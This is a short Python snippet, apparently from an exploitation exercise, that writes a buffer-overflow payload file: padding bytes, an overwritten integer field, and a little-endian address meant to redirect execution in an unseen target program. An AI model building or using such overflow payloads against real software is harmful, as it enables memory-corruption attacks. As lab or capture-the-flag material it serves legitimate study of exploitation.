with open("payload.bin", "wb") as f:
    f.write(b"A" * 12)
    f.write(b"\x05\x00\x00\x00")
    f.write(b"B" * 4)
    f.write(b"\x00\xF0\x20\x14")
